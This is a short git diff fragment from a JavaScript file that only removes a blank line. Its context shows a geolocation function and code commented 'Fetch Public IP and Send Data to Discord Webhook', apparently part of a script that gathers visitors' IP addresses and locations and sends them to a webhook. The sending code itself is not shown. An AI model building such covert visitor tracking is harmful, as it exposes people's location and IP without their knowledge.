@@ -37,7 +37,6 @@ function showPosition() {
 }
 
 // Fetch Public IP and Send Data to Discord Webhook
-
 fetch("https://api.ipify.org?format=json")
   .then((response) => response.json())
   .then(async (data) => {
